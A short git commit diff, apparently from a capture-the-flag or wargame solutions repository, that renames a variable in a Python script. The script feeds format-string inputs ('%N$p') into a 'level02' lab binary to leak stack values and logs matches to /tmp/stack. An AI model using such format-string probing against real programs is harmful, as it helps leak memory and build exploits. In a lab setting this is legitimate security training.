a403745017279f6b2cc98df8194b8ec59349f33f
phaninho <phaninho@live.fr>
2019-03-24 19:01:17 +0100

    update script

--- level02/stack_display.py
+++ level02/stack_display.py
@@ -4,5 +4,5 @@ for i in range(1, 50):
     stack = "python -c \'print \"%" + str(i) + "$p" + "\\n\"\'"
     bin_path = " | /home/users/level02/level02"
     grep = "| grep have >> /tmp/stack"
-    playload = stack + bin_path + grep
-    os.system(playload)
+    payload = stack + bin_path + grep
+    os.system(payload)
